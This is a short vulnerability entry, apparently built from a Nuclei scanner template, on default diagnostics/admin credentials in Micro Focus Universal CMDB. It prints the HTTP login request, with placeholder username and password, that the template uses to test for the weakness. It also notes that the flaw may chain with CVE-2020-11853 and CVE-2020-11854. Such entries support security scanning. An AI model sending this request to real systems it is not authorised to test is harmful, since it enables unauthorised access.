# Vulnerability: Micro Focus Universal CMDB Default Login
**Classification:** CWE-798
**Source:** Nuclei Template (`ucmdb-default-login.yaml`)

## Description
Micro Focus Universal CMDB default login credentials were discovered for diagnostics/admin. Note there is potential for this to be chained together with other vulnerabilities as with CVE-2020-11853 and CVE-2020-11854.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /ucmdb-ui/cms/loginRequest.do; HTTP/1.1
Host: {{Hostname}}

customerID=1&isEncoded=false&userName={{username}}&password={{base64(password)}}&ldapServerName=UCMDB
```

